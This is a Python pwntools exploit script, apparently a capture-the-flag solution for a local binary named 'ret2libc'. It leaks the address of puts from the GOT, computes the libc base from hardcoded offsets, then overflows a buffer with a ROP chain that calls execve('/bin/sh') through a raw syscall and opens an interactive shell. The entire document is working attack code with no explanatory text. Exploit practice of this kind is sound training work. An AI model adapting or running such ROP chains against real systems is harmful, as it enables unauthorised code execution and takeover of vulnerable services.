from pwn import *

context(log_level = 'debug')
r = process('./ret2libc')
raw_input()

puts_got = 0x601018
puts_offset = 0x0074040

r.recvuntil(': ')
r.send('0x601018')

r.recvuntil('Content: ')
puts_addr = int(r.recvuntil('\n')[:-1])
print ('%x' % puts_addr)

libc_base = puts_addr - puts_offset
print ('%x' % libc_base)

bin_sh  = libc_base + 0x183cee
pop_rdi = 0x00000000004007d3 # pop rdi ; ret
pop_rsi = libc_base + 0x0000000000026aa9 # pop rsi ; ret
pop_rdx = libc_base + 0x0000000000107545 # pop rdx ; ret
pop_rax = libc_base + 0x000000000003cff8 # pop rax ; ret
syscall = libc_base + 0x0000000000026c24 # syscall

r.recvuntil(': ')

p = 'a' * 0x38
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(pop_rsi)
p += p64(0)
p += p64(pop_rdx)
p += p64(0)
p += p64(pop_rax)
p += p64(0x3b)
p += p64(syscall)

r.send(p)

r.interactive()
